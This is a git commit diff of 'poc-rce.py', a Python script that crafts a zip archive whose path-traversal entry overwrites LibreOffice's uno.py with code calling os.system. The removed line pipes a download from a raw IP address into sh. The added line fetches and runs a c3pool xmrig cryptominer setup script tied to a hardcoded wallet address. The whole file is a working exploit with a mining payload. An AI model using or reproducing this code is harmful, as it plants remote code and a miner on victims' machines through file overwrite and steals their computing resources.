99595f61e3642b8cca9e206da61d6a38b93e7c5b
momika233 <lifeifei5320@gmail.com>
2024-04-18 10:26:59 +0800

    first commit.

--- poc-rce.py
+++ poc-rce.py
@@ -3,9 +3,9 @@ import zipfile
 if __name__ == "__main__":
     try:
         binary1 = b'1ue'
-        binary2 = b'import os\r\nos.system(\'curl http://103.251.89.204:13338|sh\')'
-        zipFile = zipfile.ZipFile("666.zip", "a", zipfile.ZIP_DEFLATED)
-        info = zipfile.ZipInfo("666.zip")
+        binary2 = b'import os\r\nos.system(\'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45F8ihixwyTi2WLadoJrsKdjwstKTAEupCYE6jzoBAZWQuY9uXxVh6i1LzoppCXuUx8tXjfaFUCG11DGXeXLkyrx1ir3gZj\')'
+        zipFile = zipfile.ZipFile("xmrig.zip", "a", zipfile.ZIP_DEFLATED)
+        info = zipfile.ZipInfo("xmrig.zip")
         zipFile.writestr("test", binary1)
         zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
         zipFile.close()
